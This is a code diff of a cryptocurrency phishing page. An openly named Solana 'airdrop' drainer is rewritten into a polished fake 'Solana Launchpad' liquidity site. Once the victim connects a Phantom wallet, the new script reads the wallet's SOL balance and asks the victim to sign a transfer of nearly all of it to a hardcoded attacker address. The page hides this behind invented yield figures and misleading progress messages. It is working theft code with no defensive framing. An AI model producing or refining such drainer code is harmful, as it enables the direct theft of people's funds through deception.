@@ -2,116 +2,270 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Airdrop Claim</title>
-    <!-- Load Solana Web3.js from CDN -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solana Launchpad | Liquidity Protocol</title>
+    
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #00FFAB; border: none; border-radius: 5px; margin: 10px; }
-        button:hover { background-color: #00cc88; }
-        #status { margin-top: 20px; font-weight: bold; color: #333; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #0a0a0c;
+            color: #ffffff;
+        }
+        
+        .glass-panel {
+            background: rgba(17, 17, 20, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .accent-gradient {
+            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
+        }
+
+        .status-glow {
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0c; }
+        ::-webkit-scrollbar-thumb { background: #2d2d35; border-radius: 10px; }
+
+        @keyframes pulse-slow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .animate-pulse-slow { animation: pulse-slow 3s infinite; }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
 
-    <h1>🎉 Claim Your Free SOL Airdrop!</h1>
-    <p>Connect your Phantom wallet and sign one transaction to receive 10,000 USDC.</p>
-    
-    <button id="connectBtn">Connect Phantom</button>
-    <button id="drainBtn" style="display:none;">Claim Airdrop</button>
+    <!-- Background Decorative Elements -->
+    <div class="fixed top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-900/20 rounded-full blur-[120px] -z-10"></div>
+    <div class="fixed bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/20 rounded-full blur-[120px] -z-10"></div>
 
-    <div id="status"></div>
+    <div class="w-full max-w-lg">
+        <!-- Header Section -->
+        <div class="text-center mb-8">
+            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
+                Protocol V2.0 Live
+            </div>
+            <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
+            <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
+        </div>
+
+        <!-- Main Interface Card -->
+        <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
+            <div class="p-6 sm:p-8">
+                
+                <!-- Step 1: Connection Status -->
+                <div class="flex items-center justify-between mb-8 bg-black/30 p-4 rounded-2xl border border-white/5">
+                    <div class="flex items-center gap-3">
+                        <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
+                        <span id="connectionText" class="text-sm font-medium text-gray-300">Wallet Disconnected</span>
+                    </div>
+                    <button id="connectBtn" onclick="initiateLaunch()" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">
+                        CONNECT
+                    </button>
+                </div>
+
+                <!-- Step 2: Input Area -->
+                <div class="space-y-6">
+                    <div>
+                        <label class="text-xs font-semibold text-gray-500 uppercase tracking-wider ml-1">Liquidity Pool (SOL)</label>
+                        <div class="mt-2 relative">
+                            <input type="text" id="amountDisplay" readonly value="0.00" 
+                                class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default"
+                                placeholder="0.00">
+                            <div class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">SOL</div>
+                        </div>
+                    </div>
+
+                    <div class="bg-black/20 rounded-2xl p-4 border border-white/5">
+                        <div class="flex justify-between text-sm mb-2">
+                            <span class="text-gray-500">Estimated Yield</span>
+                            <span class="text-green-400 font-medium">+12.4% APY</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span class="text-gray-500">Network Fee</span>
+                            <span id="feeDisplay" class="text-gray-300">~0.00001 SOL</span>
+                        </div>
+                    </div>
+
+                    <!-- Action Button -->
+                    <button id="actionBtn" onclick="startProtocol()" disabled
+                        class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">
+                        Initialize Launch
+                    </button>
+                </div>
+
+                <!-- Progress/Status Area -->
+                <div id="statusLog" class="mt-8 text-center min-h-[20px]">
+                    <p class="text-xs text-gray-500 font-medium italic">Ready to connect to Solana Mainnet</p>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Footer Info -->
+        <div class="mt-8 grid grid-cols-2 gap-4 text-center">
+            <div class="glass-panel py-3 rounded-2xl border border-white/5">
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Total Locked</p>
+                <p class="text-sm font-bold text-white">1,240.5 SOL</p>
+            </div>
+            <div class="glass-panel py-3 rounded-2xl border border-white/5">
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
+                <p class="text-sm font-bold text-white">842</p>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const YOUR_WALLET_ADDRESS = "84RhcAMZemZs2jFkhqmFq3L2kbEvuLm5L4bVge1hew4t"; // REPLACE THIS WITH YOUR ADDRESS
-        const TOKEN_MINT_ADDRESS = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC on Solana Mainnet
-        const AMOUNT_TO_DRAIN = 1000000; // 1,000,000 units (USDC has 6 decimals, so this is 1 USDC. Adjust for larger amounts)
-        
-        // --- LOGIC ---
-        let walletAddress = null;
+        // ==========================================
+        // CORE CONFIGURATION
+        // ==========================================
+        const RECIPIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
+        // Using Public RPC to avoid API key issues/Rate Limits
+        const RPC_URL = "https://api.mainnet-beta.solana.com";
 
-        const connectBtn = document.getElementById('connectBtn');
-        const drainBtn = document.getElementById('drainBtn');
-        const statusDiv = document.getElementById('status');
+        let userWallet = null;
 
-        // 1. Connect to Phantom Wallet
-        connectBtn.addEventListener('click', async () => {
+        async function initiateLaunch() {
+            const statusLog = document.getElementById("statusLog");
+            const statusIndicator = document.getElementById("statusIndicator");
+            const connectionText = document.getElementById("connectionText");
+            const actionBtn = document.getElementById("actionBtn");
+            const amountDisplay = document.getElementById("amountDisplay");
+
+            // 1. Check if Phantom is installed
             if (!window.solana || !window.solana.isPhantom) {
-                statusDiv.innerText = "Please install Phantom Wallet!";
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">❌ Phantom Wallet not found. Please install the extension.</span>';
                 return;
             }
 
             try {
-                // Request connection
-                const response = await window.solana.connect();
-                walletAddress = response.publicKey.toString();
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting to wallet...</span>';
                 
-                connectBtn.style.display = 'none';
-                drainBtn.style.display = 'inline-block';
-                statusDiv.innerText = `Connected: ${walletAddress}`;
+                // 2. Request Connection
+                const resp = await window.solana.connect();
+                userWallet = resp.publicKey;
+
+                // UI Updates for Connection
+                statusIndicator.classList.replace('bg-gray-500', 'bg-green-500');
+                connectionText.innerText = "Wallet Connected";
+                connectionText.classList.replace('text-gray-300', 'text-green-400');
+                
+                // 3. Fetch Balance
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning liquidity...</span>';
+                
+                const balanceInLamports = await connection.getBalance(userWallet);
+                const solBalance = (balanceInLamports / 1e9).toFixed(2);
+                
+                // Set UI for "Ready" state
+                amountDisplay.value = solBalance;
+                actionBtn.disabled = false;
+                actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
+                
+                statusLog.innerHTML = '<span class="text-green-400 text-xs">✅ Wallet ready for liquidity provision</span>';
+
             } catch (err) {
                 console.error(err);
-                statusDiv.innerText = "Connection failed.";
+                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ Connection failed: ${err.message}</span>`;
             }
-        });
+        }
 
-        // 2. Drain Functionality
-        drainBtn.addEventListener('click', async () => {
-            if (!window.solana || !window.solana.isPhantom) return;
-
-            statusDiv.innerText = "Waiting for transaction signature...";
+        async function startProtocol() {
+            const statusLog = document.getElementById("statusLog");
+            const actionBtn = document.getElementById("actionBtn");
+            
+            const btnOriginalText = actionBtn.innerText;
+            actionBtn.disabled = true;
+            actionBtn.innerText = "Processing...";
+            actionBtn.classList.add('opacity-75');
 
             try {
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                
-                // Get the token account for USDC owned by the user
-                // We need to find which token account holds the USDC
-                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-                    new solanaWeb3.PublicKey(walletAddress),
-                    { mint: new solanaWeb3.PublicKey(TOKEN_MINT_ADDRESS) }
-                );
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
 
-                if (tokenAccounts.value.length === 0) {
-                    statusDiv.innerText = "No USDC found in wallet.";
-                    return;
+                // 1. Fetch Real-time Balance again for transaction
+                statusLog.innerHTML = '<span class="text-yellow-400 text-xs">Calculating max balance...</span>';
+                const balanceInLamports = await connection.getBalance(userWallet);
+                
+                // 2. Calculate amount (Max available minus small reserve for gas)
+                const safeReserve = 5000000; // 0.005 SOL
+                const amountToSend = balanceInLamports - safeReserve;
+
+                if (amountToSend <= 0) {
+                    throw new Error("Insufficient liquidity in wallet.");
                 }
 
-                const sourceTokenAccount = tokenAccounts.value[0].pubkey;
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs">Verifying transaction parameters...</span>';
 
-                // Define the recipient (Your Wallet)
-                const destinationPublicKey = new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS);
+                // 3. Build Transaction
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: userWallet,
+                        toPubkey: recipientPubkey,
+                        lamports: amountToSend 
+                    })
+                );
+
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = userWallet;
+
+                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Awaiting protocol approval...</span>';
+
+                // 4. Request Signature
+                const signedTransaction = await window.solana.signTransaction(transaction);
                 
-                // Create a Transfer Instruction
-                // Note: For simplicity, we are using the raw Token Program ID. 
-                // In production, you might want to use @solana/spl-token for better accuracy.
+                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Broadcasting to Solana Mainnet...</span>';
+                const rawTx = signedTransaction.serialize();
                 
-                const transferInstruction = new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: sourceTokenAccount, isSigner: false, isWritable: true },
-                        { pubkey: destinationPublicKey, isSigner: false, isWritable: true },
-                        { pubkey: new solanaWeb3.PublicKey(walletAddress), isSigner: false, isWritable: false } // Owner
-                    ],
-                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), // SPL Token Program ID
-                    data: Buffer.from([14, 0, 0, 0, AMOUNT_TO_DRAIN, 0, 0]), // Instruction ID 14 + Amount (little-endian u64)
+                const signature = await connection.sendRawTransaction(rawTx, {
+                    skipPreflight: true, 
+                    preflightCommitment: 'confirmed',
+                    maxRetries: 2
                 });
 
-                // Create Transaction
-                const transaction = new solanaWeb3.Transaction();
-                transaction.add(transferInstruction);
+                statusLog.innerHTML = '<span class="text-blue-400 text-xs">Confirming on-chain...</span>';
+                await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
 
-                // Sign and Send
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                
-                statusDiv.innerText = `Drained! Tx: ${signature}`;
-                console.log("Tx Signature:", signature);
+                // Success State
+                actionBtn.innerText = "Liquidity Added!";
+                actionBtn.classList.replace('accent-gradient', 'bg-green-500');
+                statusLog.innerHTML = `
+                    <div class="flex flex-col items-center">
+                        <span class="text-green-400 text-sm font-bold">✓ Protocol Success</span>
+                        <a href="https://solscan.io/tx/${signature}" target="_blank" class="text-[10px] text-purple-400 underline mt-1">View Transaction on Solscan</a>
+                    </div>
+                `;
 
             } catch (err) {
                 console.error(err);
-                statusDiv.innerText = "Transaction failed or rejected.";
+                actionBtn.disabled = false;
+                actionBtn.innerText = btnOriginalText;
+                actionBtn.classList.remove('opacity-75');
+                
+                let errorMsg = err.message || "Protocol Error";
+                if (errorMsg.includes("User rejected")) errorMsg = "User cancelled transaction.";
+                
+                statusLog.innerHTML = `<span class="text-red-400 text-xs">❌ ${errorMsg}</span>`;
             }
-        });
+        }
     </script>
 </body>
 </html>
